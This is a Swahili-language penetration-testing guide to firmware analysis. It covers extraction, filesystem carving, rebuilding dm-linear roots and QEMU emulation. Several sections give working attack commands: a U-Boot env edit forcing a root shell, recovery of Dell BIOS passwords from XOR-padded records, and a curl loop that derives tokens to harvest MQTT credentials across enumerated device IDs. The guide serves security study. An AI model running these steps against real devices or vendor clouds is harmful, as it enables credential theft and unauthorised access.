# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana

Kwa ajili ya kupata firmware kupitia miingiliano ya hardware iliyo wazi, angalia [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) na [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Kwa ajili ya kunasa UART wakati wa kuwasha kwa njia inayoweza kurudiwa kabla ya kufikia console, angalia [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni software muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kudhibiti na kuwezesha mawasiliano kati ya vipengele vya hardware na software ambayo watumiaji hutumia. Huhifadhiwa kwenye memory ya kudumu, na hivyo kuhakikisha kifaa kinaweza kufikia maagizo muhimu mara tu kinapowashwa, jambo linalosababisha mfumo wa uendeshaji kuanzishwa. Kuchunguza na huenda kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa usalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali ya kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Usanifu wa CPU na mfumo wa uendeshaji unaotumia
- Maelezo ya bootloader
- Muundo wa hardware na datasheets
- Vipimo vya codebase na maeneo ya source code
- Maktaba za nje na aina za leseni
- Historia za masasisho na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, pamoja na uchanganuzi wa vipengele vyovyote vya open-source software vinavyopatikana kwa kutumia michakato ya ukaguzi wa mikono na ya kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [Semmle’s LGTM](https://lgtm.com/#explore) hutoa static analysis ya bure inayoweza kutumika kutafuta matatizo yanayoweza kuwepo.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- Kuipata **moja kwa moja** kutoka kwa chanzo (watengenezaji, makampuni ya uzalishaji)
- **Kuijenga** kwa kufuata maelekezo yaliyotolewa
- **Kuipakua** kutoka kwenye tovuti rasmi za usaidizi
- Kutumia queries za **Google dork** kutafuta faili za firmware zilizowekwa mtandaoni
- Kufikia **cloud storage** moja kwa moja, kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kuingilia **masasisho** kwa kutumia mbinu za man-in-the-middle
- **Kuitoa** kwenye kifaa kupitia miunganisho kama **UART**, **JTAG**, au **PICit**
- **Kusikiliza** maombi ya masasisho katika mawasiliano ya kifaa
- Kutambua na kutumia **endpoints za masasisho zilizowekwa moja kwa moja kwenye code**
- **Kuidump** kutoka kwenye bootloader au mtandao
- **Kuondoa na kusoma** chipu ya hifadhi, ikiwa njia nyingine zote hazijafaulu, kwa kutumia zana zinazofaa za hardware

### Logs za UART pekee: lazimisha root shell kupitia U-Boot env iliyo kwenye flash

Ikiwa UART RX inapuuzwa (logs pekee), bado unaweza kulazimisha init shell kwa **kuhariri blob ya U-Boot environment ukiwa nje ya kifaa**:<sup>[[6]](#references)</sup>

1. Dump SPI flash kwa kutumia SOIC-8 clip na programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Tafuta partitioni ya env ya U-Boot, hariri `bootargs` ili ijumuishe `init=/bin/sh`, na **ukokotoe upya U-Boot env CRC32** ya blob.
3. Flash upya partitioni ya env pekee kisha uwashe upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye vifaa vilivyopachikwa ambapo shell ya bootloader imezimwa lakini partitioni ya env inaweza kuandikiwa kupitia ufikiaji wa flash ya nje.

## Kuchanganua firmware

Sasa kwa kuwa **una firmware**, unahitaji kutoa taarifa kuihusu ili kujua jinsi ya kuishughulikia. Kuna zana tofauti unazoweza kutumia kwa hilo:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ikiwa hutapata mengi kwa kutumia zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`. Ikiwa entropy ni ndogo, huenda haijasimbwa kwa njia fiche. Ikiwa entropy ni kubwa, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files zilizopachikwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Uchambuzi linganishi wa flash na hifadhi za siri za XOR zinazoweza kurejeshwa

Ikiwa setting ya firmware haina format ya hifadhi iliyoandikwa kwenye nyaraka, kwanza fanya reads kadhaa zinazolingana za flash, badilisha setting **moja tu**, kisha dump chip nzima tena na ulinganishe offsets. Kurudia jaribio kwa kutumia values zilizodhibitiwa husaidia kutofautisha setting hiyo na counters pamoja na metadata ya uandishi; mabadiliko kwenye offsets mpya badala ya sehemu zilezile yanaashiria hifadhi ya append-only au iliyopangwa kwa log. Hifadhi entries zilizofutwa/kuwekewa alama ya kufutwa kwa sababu bytes za payload zake huenda bado zikaweza kurejeshwa.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Baada ya kupata eneo hilo, toa firmware modules kwa kutumia zana kama `binwalk` na ufanye reverse engineering ya writer/validator katika Ghidra. Thibitisha mipaka ya field, padding, uorodheshaji wa keys na uundaji wa key kwenye code badala ya kukisia scheme kutokana na mifumo ya ciphertext pekee.<sup>[[12]](#references)</sup>

#### Rejesha keys kutoka kwenye zero padding iliyosimbwa kwa njia fiche

Kama ilivyoelezwa katika [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), known plaintext hufichua bytes za keystream katika offsets zilezile. Field yenye ukubwa usiobadilika huwa hatarini hasa wakati zero padding yake inajumuisha kila index ya XOR key inayojirudia: padding iliyosimbwa hufichua bytes hizo za key moja kwa moja kwa sababu `0x00 XOR key_byte = key_byte`. Ikiwa kila index ya key imejumuishwa, jenga upya key kutoka kwenye mwisho wa ciphertext na uondoe usimbaji kwenye bytes zenye data.<sup>[[12]](#references)</sup>

Muundo wa DVAR BIOS-password ulio katika Dell na wenye athari hii ni mfano halisi: byte `0` ya field ya bytes 32 iko wazi, ilhali bytes `1..31` hutumia key inayojirudia ya bytes 20.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Kwa urefu wa nenosiri `L`, nafasi `L..31` zilikuwa sifuri kabla ya XOR. Wakati `L <= 12`, nafasi hizo hufunika kila faharasa ya ufunguo, kwa hiyo ufunguo kamili na nenosiri hupatikana bila brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Pata keys kutoka kwenye rekodi za zamani

Usichanganue kila rekodi kivyake. Key ya DVAR inatokana takribani na `modified_md5(device_seed || variable_GUID || password[0])`: device seed na GUID hazibadiliki, na ingizo pekee linalotegemea password ni byte yake ya kwanza iliyo wazi. Hii hutoa keys zisizozidi 256 kwa kila kifaa, na rekodi zinazoanza na byte ileile hushiriki key moja. Panga rekodi hai na zilizofutwa kulingana na byte hiyo; rekodi fupi ya zamani inaweza kuvuja key nzima kupitia padding na kutumika kusimbua rekodi mpya ndefu zaidi ambayo padding yake haitoshi. Kwa hiyo, kubadilisha password kunaweza kuongeza hatari pale ciphertext ya zamani inapowekwa alama ya kufutwa badala ya kufutwa kabisa.<sup>[[12]](#references)</sup>

Zana ya [`dellpwn`](https://github.com/R3n5k1/dellpwn) hupata DVAR, huthibitisha rekodi zinazowezekana, hurejesha passwords, na inaweza kuonyesha bytes ghafi zilizohifadhiwa/za key. Iunde kutoka kwenye checkout kisha uchanganue image ya flash iliyothibitishwa kama ifuatavyo:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Kwa custom parsers, kataa matokeo chanya ya uongo kwa kutumia muundo wa rekodi, masharti ya herufi zinazoweza kuchapishwa, ukaguzi wa zero-padding, entropy ya key, na uthabiti mahali ambapo key huzunguka. Ikiwa dumps zinazorudiwa zinaonyesha mabadiliko machache ya biti kwa kila write, orodhesha masks zilizozingatiwa na panga marekebisho kwa kutumia masharti haya, lakini ripoti herufi zisizo na uhakika badala ya kuwasilisha matokeo ya heuristic kana kwamba ni urejeshaji sahihi.<sup>[[12]](#references)</sup>

Password verifiers zinapaswa kuhifadhi salted, iterated one-way hash badala ya reversible ciphertext, na log-structured stores zinapaswa kuondoa kwa usalama secret material iliyopitwa na wakati.<sup>[[12]](#references)</sup>

### Kupata Filesystem

Kwa kutumia tools za awali zilizo na maoni kama `binwalk -ev <bin>`, unapaswa kuwa umeweza **kutoa filesystem**.\
Kwa kawaida, Binwalk huitoa ndani ya **folder iliyopewa jina la aina ya filesystem**, ambayo kwa kawaida ni mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Kutoa Filesystem Mwenyewe

Wakati mwingine, binwalk **haitakuwa na magic byte ya filesystem kwenye signatures zake**. Katika hali hizi, tumia binwalk **kupata offset ya filesystem na kuchonga filesystem iliyobanwa** kutoka kwenye binary, kisha **utoe filesystem mwenyewe** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Tekeleza **dd command** ili kuchonga mfumo wa faili wa Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Baadaye, faili zitakuwa kwenye saraka ya "`squashfs-root`".

- Faili za archive za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Kuunda upya mifumo ya faili ya root ya embedded iliyogawanywa

Ikiwa dump ghafi ya eMMC/SSD ina header halali ya mfumo wa faili lakini offset za metadata yake zinaenea nje ya mipaka ya kizigeu kilichotajwa, usiihitimishe mara moja kuwa imeharibika. Msimbo wa boot wa embedded unaweza kuunganisha kifaa halisi cha root kutoka kwenye sehemu nyingi za kimwili kwa kutumia Device Mapper, hivyo kuchonga kizigeu kimoja cha GPT hutoa sehemu ya kwanza tu.<sup>[[9]](#references)</sup>

#### Kuchunguza media image nzima

Kwanza thibitisha kuwa upatikanaji umekamilika, ukubwa ni thabiti, na hakuna mchakato wa kuandika ambao bado unatumia image. Ikiwa jina la faili lina anwani za mwanzo/mwisho, linganisha masafa hayo na idadi halisi ya byte. Rejesha GPT katika hali ya kusoma pekee na uambatishe masafa yanayohitajika pekee; **usiendeshe** `vgchange -ay` dhidi ya physical volume isiyoaminika kwenye workstation kwa sababu migongano ya volume group na uandishi usiokusudiwa vinaweza kutokea.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Pendelea kutumia VM inayoweza kutupwa wakati logic ya awali ya init au stack ya LVM inahitaji kuona image nzima. Logi za kihistoria za boot kutoka kwenye partition ya kawaida ya boot ni muhimu sana: bootloader huenda iliweka logi za offsets za proprietary-container, urefu wa vipengele, uteuzi wa slot, kanuni za alignment na uthibitishaji wa signature. Tumia thamani hizo kutoa command line/kernel/initramfs iliyopachikwa, kisha uthibitishe kila output kivyake kwa `file`, magic bytes na `binwalk`; kusoma hadi mwisho wa container kunaweza kuongeza initrd, ACPI object au signature kimakosa kwenye kernel.<sup>[[9]](#references)</sup>

#### Rejesha ramani ya block wakati wa boot

Toa initramfs ya kernel na ufanye reverse engineering ya `/init` pamoja na library zozote za storage. Katika [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), fuatilia marejeleo ya string za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` na njia za partition; kisha fuatilia code inayochagua slot inayotumika ya A/B na kuunda jedwali. Sehemu nzuri za kuanzia kwenye radare2 ni `r2 -A init`, `afl`, `pdf @ main` na `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Linear target huweka safu zinazofuatana za kifaa pepe juu ya safu za kifaa kimoja au zaidi vinavyotoa hifadhi. Jedwali la sehemu mbili lililorejeshwa kwa kawaida huwa na umbo hili (nafasi na urefu wote ni sekta za baiti 512):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Rudia hesabu za machine-code sawasawa, ikijumuisha upana wa integer, shifts na ubadilishaji wa vipimo. Kwa mfano, usemi ufuatao hukata ukubwa wa byte hadi kwenye mpaka wa 4-KiB, kisha ndipo huubadilisha kuwa sectors za 512-byte; kuubadilisha na `p4_bytes // 512` huhamisha sehemu ya mwisho iliyochaguliwa kwa `p4_bytes % 4096` kila wakati partition haija-aligniwa kwenye page.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekebisha image tambarare ya uchanganuzi kwa kunakili masafa kwa mpangilio wa jedwali, ukitumia vipande vyenye ukubwa uliowekewa kikomo badala ya kupakia media dump nzima kwenye memory. Hii pia huepusha kuunda vifaa vya mapper upande wa host. Weka offsets zilizotokana na GPT, idadi za sekta zilizogeuzwa, na urefu wa matokeo kama assertions tofauti.<sup>[[9]](#references)</sup>

#### Tofautisha uharibifu na hitilafu ya mara kwa mara ya urekebishaji

Kwa SquashFS, kagua magic ya `hsqs` na decode field ya `bytes_used` ya little-endian 64-bit iliyo kwenye superblock offset 40 kabla ya kuendesha `unsquashfs`. Ikiwa uchimbaji unashindwa katika miundo kadhaa isiyohusiana, tafuta katika window pana inayozunguka nafasi zinazotarajiwa na utake wagombea wa kimuundo wenye ushahidi thabiti: metadata block inayoweza decompressiwa, directory entries kadhaa halali zinazofuatana, inode fields zinazowezekana, root inode inayoendana na idadi ya inode, au muundo halali wa integrity metadata. Ulinganifu mmoja tu wa magic hautoshi.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wakati delta ileile yenye alama sahihi inafanya miundo huru iwe halali—kwa mfano, metadata ya directory na rekodi ya verity—sababu inayowezekana ni kosa la kimfumo la mwanzo wa segment, badala ya kukosekana kwa byte. Rudi kwenye hesabu iliyogeuzwa na uchunguze kama kuna mabaki yaliyotupwa, signedness, overflow, au mzunguko wa sector/page kabla ya kujaribu kurejesha orphan au kurekebisha metadata ya filesystem.<sup>[[9]](#references)</sup>

Hatimaye, tenganisha mipaka ya ulinzi: volumes za LUKS zilizofungwa kwa TPM hulinda usiri wa data, ilhali mapping ya dm-verity iliyotiwa saini hulinda uadilifu wa root filesystem. TPM ya software haiwezi kurejesha ufunguo uliofungwa kwa TPM halisi ya awali, na kuanzisha SquashFS iliyorekebishwa kupitia init ya utafiti pekee ambayo haifanyi uthibitishaji wa verity hakughushi sahihi yake wala kuvunja dm-verity.<sup>[[9]](#references)</sup>

## Kuchanganua Firmware

Baada ya firmware kupatikana, ni muhimu kuichanganua ili kuelewa muundo wake na uwezekano wa udhaifu. Mchakato huu hutumia zana mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Awali za Uchambuzi

Seti ya amri imetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua data ya binary, na kuelewa maelezo ya partition na filesystem:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Ili kutathmini hali ya usimbaji fiche ya image, **entropia** hupimwa kwa kutumia `binwalk -E <bin>`. Entropia ya chini hudokeza ukosefu wa usimbaji fiche, ilhali entropia ya juu huashiria uwezekano wa usimbaji fiche au compression.

Kwa **faili zilizopachikwa**, inapendekezwa kutumia zana na nyenzo kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili.

### Kutoa Mfumo wa Faili

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa mfumo wa faili, mara nyingi kwenye saraka iliyopewa jina la aina ya mfumo wa faili (k.m., squashfs, ubifs). Hata hivyo, **binwalk** inaposhindwa kutambua aina ya mfumo wa faili kwa sababu ya kukosekana kwa magic bytes, uchimbaji wa mikono unahitajika. Hii inahusisha kutumia `binwalk` kutafuta offset ya mfumo wa faili, kisha kutumia amri ya `dd` kuikata na kuitoa:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Baadaye, kutegemea aina ya filesystem (kwa mfano, squashfs, cpio, jffs2, ubifs), hutumika amri tofauti ili kutoa maudhui kwa mikono.

### Uchambuzi wa Filesystem

Baada ya filesystem kutolewa, huanza kutafuta dosari za usalama. Huangaliwa daemon za mtandao zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, API endpoints, utendaji wa seva ya masasisho, code ambayo haijacompileiwa, startup scripts na binaries zilizocompileiwa kwa ajili ya uchambuzi wa offline.

**Maeneo muhimu** na **vipengee** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa ajili ya credentials za watumiaji
- Vyeti na keys za SSL katika **etc/ssl**
- Faili za usanidi na script kwa ajili ya kutafuta uwezekano wa vulnerabilities
- Binaries zilizopachikwa kwa ajili ya uchambuzi zaidi
- Web servers na binaries zinazotumika kwa kawaida kwenye vifaa vya IoT

Zana kadhaa husaidia kufichua taarifa nyeti na vulnerabilities ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa ajili ya kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa ajili ya uchambuzi wa kina wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa ajili ya uchambuzi tuli na wa nguvu

### Ukaguzi wa Usalama kwenye Binaries Zilizocompileiwa

Source code na binaries zilizocompileiwa zinazopatikana kwenye filesystem lazima zichunguzwe kwa makini ili kubaini vulnerabilities. Zana kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kutambua binaries zisizolindwa ambazo zinaweza kutumiwa vibaya.

## Kupata usanidi wa cloud na credentials za MQTT kupitia tokens za URL zinazotokana na thamani nyingine

Hubs nyingi za IoT hupata usanidi wa kila kifaa kutoka kwenye endpoint ya cloud inayoonekana hivi:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa uchambuzi wa firmware, unaweza kugundua kuwa `<token>` hutokana na device ID ya kifaa husika kwa kutumia secret iliyowekwa moja kwa moja kwenye code, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) na huwakilishwa kama hex ya herufi kubwa

Muundo huu humwezesha mtu yeyote anayejua deviceId na STATIC_KEY kuunda upya URL na kupata usanidi wa cloud, ambao mara nyingi hufichua credentials za MQTT zilizo katika maandishi wazi na viambishi awali vya topic.

Mtiririko wa kazi wa vitendo:

1) Toa deviceId kutoka kwenye logi za UART za boot

- Unganisha adapta ya UART ya 3.3V (TX/RX/GND) na unase logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tafuta mistari inayochapisha muundo wa URL ya usanidi wa cloud na anwani ya broker, kwa mfano:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Pata STATIC_KEY na algorithm ya token kutoka kwenye firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute njia ya config ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (kwa mfano, MD5(deviceId||STATIC_KEY)).
- Pata token kwenye Bash na uweke digest katika herufi kubwa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Kusanya usanidi wa cloud na credentials za MQTT

- Unda URL na upakue JSON kwa curl; ichanganue kwa jq ili kutoa secrets:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Tumia vibaya MQTT ya plaintext na ACL dhaifu za topic (ikiwa zipo)

- Tumia credentials zilizopatikana kujisajili kwenye maintenance topics na kutafuta matukio nyeti:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Orodhesha device IDs zinazotabirika (kwa kiwango kikubwa, kwa idhini)

- Mifumo mingi hujumuisha byte za vendor OUI/product/type zikifuatiwa na kiambishi tamati cha mfuatano.
- Unaweza kujaribu IDs zinazowezekana, kutoa tokens na kupata configs kwa njia ya programu:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Maelezo
- Pata idhini ya wazi kila wakati kabla ya kujaribu kufanya mass enumeration.
- Ikiwezekana, pendelea emulation au static analysis ili kurejesha siri bila kubadilisha hardware lengwa.

Mchakato wa kufanya emulation ya firmware huwezesha **dynamic analysis** ya jinsi kifaa kinavyofanya kazi au ya programu moja moja. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au usanifu, lakini kuhamisha root filesystem au binary mahususi hadi kwenye kifaa chenye usanifu na mpangilio wa endianness unaolingana, kama Raspberry Pi, au hadi kwenye mashine pepe iliyotayarishwa awali, kunaweza kurahisisha majaribio zaidi.

### Kufanya Emulation ya Binary Mahususi

Unapochunguza programu moja moja, ni muhimu kutambua endianness na usanifu wa CPU wa programu hiyo.

#### Mfano wa Usanifu wa MIPS

Ili kufanya emulation ya binary ya usanifu wa MIPS, unaweza kutumia amri:

```bash
file ./squashfs-root/bin/busybox
```

Na kusakinisha zana muhimu za uigaji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Kwa MIPS (big-endian), hutumika `qemu-mips`, na kwa binaries za little-endian, chaguo ni `qemu-mipsel`.

#### Uigaji wa ARM Architecture

Kwa binaries za ARM, mchakato unafanana, huku emulator ya `qemu-arm` ikitumika kwa uigaji.

### Uigaji wa Mfumo Mzima

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, hurahisisha uigaji kamili wa firmware, huendesha mchakato kiotomatiki na kusaidia katika dynamic analysis.

### Kujenga upya root filesystems zilizogawanywa na kuthibitishwa kwa ajili ya uigaji

Ikiwa superblock ya SquashFS inasomeka lakini offsets za inode, directory au fragment-table haziwezekani, usirekebishe `unsquashfs` mara moja. Reverse-engineer binary ya early boot na uunde upya grafu ya block-device inayoitengeneza: mifumo iliyopachikwa inaweza kuonyesha partition ya root inayoonekana ya kawaida lakini ikajenga filesystem halisi kwa kutumia mapping ya `dm-linear` inayoongeza sectors zilizokopwa kutoka partition nyingine. Ukaguzi wa superblock pekee unaweza kufaulu hata kama kila metadata block inayofuata imehamishwa.<sup>[[11]](#references)</sup>

Hifadhi hesabu za firmware kama zilivyo. Hasa, tambua kama urefu umeonyeshwa kwa bytes, sectors za baiti 512, au pages za 4 KiB; rudia shifts na truncation kwa mpangilio wake wa awali; na zingatia maeneo ya mwisho yanayotegemea bank katika mipangilio ya A/B. Kwa mfano, `(partition_bytes >> 12) << 3` hukata kwanza hadi mpaka wa 4 KiB na kisha tu kueleza matokeo kwa sectors za baiti 512; kuibadilisha na `partition_bytes // 512` kunaweza kusogeza extent iliyoongezwa kwa kilobytes chache na kuharibu jedwali zote za SquashFS zinazofuata.<sup>[[11]](#references)</sup>

Mtiririko mzuri wa uthibitishaji ni:<sup>[[11]](#references)</sup>

1. Pata kila kifaa chanzo, sector ya kuanzia na urefu wa segment ya `dm-linear` kutoka kwa binary ya verifier/init.
2. Unganisha au panga extents bila kubadilisha semantiki zake za alignment.
3. Ikiwa extraction bado inashindwa, tafuta ndani ya dirisha dogo tu karibu na mpaka uliotabiriwa na uhitaji metadata structures kadhaa halali zinazofuatana, badala ya kukubali superblock inayoonekana kuwa sahihi pekee.
4. Endesha `unsquashfs` isiyobadilishwa dhidi ya image iliyojengwa upya; kufanikiwa kupitia directories na fragments zote ni ushahidi thabiti zaidi kuliko `unsquashfs -stat`.

#### Ubadilishaji wa dm-verity unaodhibitiwa na mchambuzi

Mchambuzi anapodhibiti kernel ya QEMU, initramfs na virtual disks, root iliyorekebishwa inaweza kuwashwa kwa kubadilisha PID 1 ya uthibitishaji ya mtengenezaji na init ndogo iliyounganishwa statically. Huu ni **ubadilishaji wa boot chain kwa ajili ya maabara**, si kuvunja dm-verity, sahihi yake ya RSA, Secure Boot au ufunguo uliofungwa kwa TPM.<sup>[[11]](#references)</sup>

Init mbadala inapaswa kuiga sehemu za kiutendaji za njia ya awali ya boot: mount `devtmpfs`, kuita `setsid()`, kuunganisha `/dev/console` na file descriptors 0–2, mount `/proc` na `/sys`, kusubiri block device iliyotolewa, mount root iliyohaririwa katika hali ya kusoma pekee, kutenganisha pseudo-filesystems za old-root, kuhamisha mount mpya juu ya `/`, kutumia `chroot`, na kuendesha `/sbin/init` ya awali ya firmware kwa `execve()`. Kutenganisha `/dev`, `/proc` na `/sys` **kabla** ya `MS_MOVE` huzuia kutenganisha kwa bahati mbaya mount points zinazomilikiwa na root mpya.<sup>[[11]](#references)</sup>

Weka hali ya kifaa inayoweza kubadilika tofauti na root isiyobadilika iliyorekebishwa. Overlay ya qcow2 inaweza kuhifadhi hali ya LVM ya diski asili huku diski ya pili ya virtio ya kusoma pekee ikitoa SquashFS iliyohaririwa:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Utatuzi wa hitilafu za hali ya image nje ya mtandao

